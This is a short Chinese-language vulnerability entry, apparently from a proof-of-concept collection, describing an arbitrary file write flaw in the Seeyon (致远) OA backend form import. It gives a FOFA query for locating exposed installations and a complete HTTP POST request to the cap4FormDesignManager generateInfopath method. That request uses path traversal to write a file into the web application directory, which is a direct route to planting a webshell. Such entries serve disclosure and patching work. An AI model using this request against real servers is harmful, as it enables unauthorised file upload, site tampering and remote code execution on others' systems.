# 致远OA后台表单导入任意文件写入漏洞

致远OA后台表单导入任意文件写入漏洞，允许攻击者上传恶意文件到服务器，可能导致远程代码执行、网站篡改或其他形式的攻击，严重威胁系统和数据安全。

## fofa

```javascript
app="致远互联-OA"
```

## poc

```javascript
POST /seeyon/ajax.do?method=ajaxAction&managerName=cap4FormDesignManager HTTP/1.1
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Connection: keep-alive
Content-Length: 331
Content-Type: application/x-www-form-urlencoded;charset=UTF-8
Cookie: ts=1728653264995; JSESSIONID=EADD9E1D7E239870F85E73935AC9AD34; loginPageURL=; login_locale=zh_CN; avatarImageUrl=5995465946958220283
Host: 192.168.18.129:8085
RequestType: AJAX
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0

managerMethod=generateInfopath&arguments={"files":[{"fileName":"../../../../../../ApacheJetspeed/webapps/seeyon/11.txt","fileContent":"1111"}]}
```

![8fe957553635d968043dff547bca65ce](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202410131410574.png)



## 漏洞来源

- https://mp.weixin.qq.com/s/kRCNBIbWvgdJ1BLWl31SYQ
